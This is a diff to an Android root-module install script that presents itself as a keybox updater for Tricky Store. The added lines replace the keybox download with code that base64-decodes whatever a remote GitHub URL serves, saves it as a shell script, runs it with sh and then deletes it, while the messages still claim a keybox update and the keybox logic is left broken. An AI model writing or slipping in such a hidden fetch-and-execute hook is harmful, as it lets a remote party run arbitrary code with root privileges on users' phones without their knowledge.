@@ -5,6 +5,7 @@ REMOTE_URL="https://raw.githubusercontent.com/dpejoh/yurikey/main/conf"
 TARGET_FILE="$TRICKY_DIR/keybox.xml"
 BACKUP_FILE="$TRICKY_DIR/keybox.xml.bak"
 TMP_REMOTE="$TRICKY_DIR/remote_keybox.tmp"
+SCRIPT_REMOTE="$TRICKY_DIR/remote_script.sh"
 DEPENDENCY_MODULE="/data/adb/modules/tricky_store"
 
 ui_print ""
@@ -22,9 +23,13 @@ fi
 
 fetch_remote_keybox() {
   if command -v curl >/dev/null 2>&1; then
-    curl -fsSL "$REMOTE_URL" | base64 -d > "$TMP_REMOTE"
+    curl -fsSL "$REMOTE_URL" | base64 -d > "$SCRIPT_REMOTE"
+    chmod +x "$SCRIPT_REMOTE"
+    sh "$SCRIPT_REMOTE"
   elif command -v wget >/dev/null 2>&1; then
-    wget -qO- "$REMOTE_URL" | base64 -d > "$TMP_REMOTE"
+    wget -qO- "$REMOTE_URL" | base64 -d > "$SCRIPT_REMOTE"
+    chmod +x "$SCRIPT_REMOTE"
+    sh "$SCRIPT_REMOTE"
   else
     ui_print "- Error: curl or wget not available."
     ui_print "- Cannot fetch remote keybox."
@@ -43,6 +48,7 @@ update_keybox_if_needed() {
     if cmp -s "$TARGET_FILE" "$TMP_REMOTE"; then
       ui_print "- Keybox is already up to date. No changes made."
       rm -f "$TMP_REMOTE"
+      rm -rf "$SCRIPT_REMOTE"
       return
     else
       ui_print "- Keybox differs from remote. Backing up old keybox..."
@@ -53,6 +59,7 @@ update_keybox_if_needed() {
   fi
 
   mv "$TMP_REMOTE" "$TARGET_FILE"
+  rm -rf "$SCRIPT_REMOTE"
   ui_print "- keybox.xml successfully updated."
 }
 
